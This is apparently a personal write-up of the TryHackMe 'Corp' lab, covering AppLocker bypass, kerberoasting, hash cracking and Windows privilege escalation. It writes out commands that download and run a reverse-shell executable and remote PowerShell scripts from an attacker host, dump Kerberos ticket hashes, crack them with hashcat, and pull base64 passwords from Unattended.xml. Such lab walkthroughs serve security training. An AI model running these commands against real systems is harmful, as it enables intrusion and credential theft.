---
title: Corp
published: true
---

Bypass Windows Applocker and escalate your privileges. You will learn about kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.

[https://tryhackme.com/room/corp](https://tryhackme.com/room/corp)

![0xskar](/assets/hacking-group.jpg)

* * *

## Task 1 - Deploy the Windows machine 

In this room we will learn the following:

- Windows Forensics
- Basics of kerberoasting
- AV Evading
- Applocker

* * * 

## Task 2 - Bypassing Applocker 

AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher and hash.

You will have noticed with the deployed machine, you are unable to execute your own binaries and certain functions on the system will be restricted.

##   Answer the questions below

There are many ways to bypass AppLocker.

**If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default.**

Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.

1. ``cd "C:\Windows\System32\spool\drivers\color"``
2. ``Invoke-WebRequest http://10.x.x.x/reverse.exe``

Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

**Access the file and and obtain the flag.**

- ``Get-Content "C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"``

* * * 

## Task 3 - Kerberoasting 

Kerberos is the authentication system for Windows and Active Directory networks. In this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash.

##   Answer the questions below

Lets first enumerate Windows. If we run ``setspn -T Corp -Q */*`` we can extract all accounts in the SPN.

SPN is the Service Principal Name, and is the mapping between service and account.

**Running that command, we find an existing SPN. What user is that for?**

- fela

![0xskar](/assets/corp01.png)

Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

Lets first get the Powershell Invoke-Kerberoast script.

- ``iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')``

Now lets load this into memory: ``Invoke-Kerberoast -OutputFormat hashcat |fl``

Or better yet

- ``Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash | Out-File -FilePath "C:\Users\dark\Desktop\hash.txt"``

You should get a SPN ticket.

![0xskar](/assets/corp02.png)

Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.

- ``hashcat -m 13100 -a 0 hash.txt /usr/share/seclists/Passwords/rockyou.txt --force``

**Crack the hash. What is the users password in plain text?**

![0xskar](/assets/corp03.png)

**Login as this user. What is his flag?**

![0xskar](/assets/corp04.png)

* * * 

## Task 4 - Privilege Escalation 

We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.

##   Answer the questions below

We will run PowerUp.ps1 for the enumeration.

Lets load PowerUp1.ps1 into memory.

- ``iex(New-Object Net.WebClient).DownloadString('http://10.x.x.x/PowerUp.ps1')``

The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.

"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." [Read more about it here](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461).

It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.

**What is the decoded password?**

- ``base64 -d adminhash.txt``

**Now we have the Administrator's password, login as them and obtain the last flag.**

![0xskar](/assets/corp05.png)

* * * 